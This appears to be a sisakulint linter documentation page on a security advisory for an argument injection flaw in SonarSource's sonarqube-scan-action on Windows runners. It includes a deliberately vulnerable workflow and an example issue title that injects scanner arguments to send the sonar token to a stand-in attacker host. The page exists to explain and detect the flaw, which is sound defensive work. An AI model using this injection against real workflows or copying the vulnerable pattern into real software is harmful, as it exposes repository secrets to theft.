# GHSA-5xq9-5g24-4g6f

## Summary
| Field | Value |
|-------|-------|
| Advisory ID | GHSA-5xq9-5g24-4g6f |
| CVE | CVE-2025-59844 |
| Affected Action | SonarSource/sonarqube-scan-action |
| Severity | High (CVSS 7.7) |
| Vulnerability Type | Argument Injection (CWE-78) |
| Affected Versions | >= 4.0.0, < 6.0.0 |
| Patched Version | 6.0.0 |
| Published | 2025 |

## Vulnerability Description

The SonarSource/sonarqube-scan-action versions 4.0.0 through 5.x are vulnerable to command injection on Windows runners when workflows pass user-controlled input to the `args` parameter without proper validation. This vulnerability **bypasses a previous security fix** and allows arbitrary command execution, potentially leading to exposure of sensitive environment variables and compromise of the runner environment.

**Technical Root Cause:** On Windows, the action uses a shell to execute the scanner, and insufficient input sanitization allows attackers to inject additional command-line arguments. These injected arguments can:
- Override SonarQube project configuration
- Exfiltrate secrets via custom properties (e.g., `-Dsonar.token` redirection)
- Modify analysis behavior to hide vulnerabilities
- Access sensitive environment variables including `GITHUB_TOKEN`

## Vulnerable Pattern

```yaml
on:
  pull_request_target:

jobs:
  scan:
    runs-on: windows-latest
    steps:
      - uses: SonarSource/sonarqube-scan-action@v2
        with:
          args: ${{ github.event.issue.title }}
```

**Attack Vector**: An attacker creates an issue with title:
```
test /d:sonar.token=secret /d:sonar.host.url=https://attacker.com
```

This injects additional arguments to the scanner, potentially exfiltrating tokens to an attacker-controlled server.

## Safe Pattern

```yaml
on:
  pull_request_target:

jobs:
  scan:
    runs-on: windows-latest
    steps:
      - uses: SonarSource/sonarqube-scan-action@v2
        with:
          args: >
            -Dsonar.projectKey=my-project
            -Dsonar.sources=.
```

**Mitigation**: Do not pass untrusted input to the `args` parameter. Use fixed, hardcoded arguments or validate input before use.

## Detection in sisakulint

### Detection Result

```
script/actions/advisory/GHSA-5xq9-5g24-4g6f-vulnerable.yaml:9:3: dangerous trigger (critical): workflow uses privileged trigger(s) [pull_request_target] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
script/actions/advisory/GHSA-5xq9-5g24-4g6f-vulnerable.yaml:17:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 9). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
```

### Analysis

| Expected | Detected | Rule |
|----------|----------|------|
| Untrusted checkout with privileged trigger | Yes | dangerous-triggers-critical, untrusted-checkout |

sisakulint detected multiple security issues related to this vulnerability:

1. **dangerous-triggers-critical**: Detected that the `pull_request_target` trigger is used without appropriate security mitigations
2. **untrusted-checkout**: Detected that untrusted PR code is checked out in a workflow using privileged triggers

These detections help identify the dangerous context that is a prerequisite for the Argument Injection vulnerability. However, the direct passing of untrusted input to the `args` parameter was not detected because it was not included in the sample workflow.

## References

### GitHub Links
- GitHub Advisory: https://github.com/advisories/GHSA-5xq9-5g24-4g6f
- Repository: https://github.com/SonarSource/sonarqube-scan-action
- Repository Security Advisory: https://github.com/SonarSource/sonarqube-scan-action/security/advisories/GHSA-5xq9-5g24-4g6f
- Release: https://github.com/SonarSource/sonarqube-scan-action/releases/tag/v6.0.0

### External References
- CVE-2025-59844: https://nvd.nist.gov/vuln/detail/CVE-2025-59844
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- SonarSource Community: https://community.sonarsource.com/t/sonarqube-scanner-github-action-v6/149281

### Credits
- Finder: Francois Lajeunesse-Robert (Boostsecurity.io)

### Related sisakulint Rules
- [ArgumentInjectionRule](../argumentinjection.md)
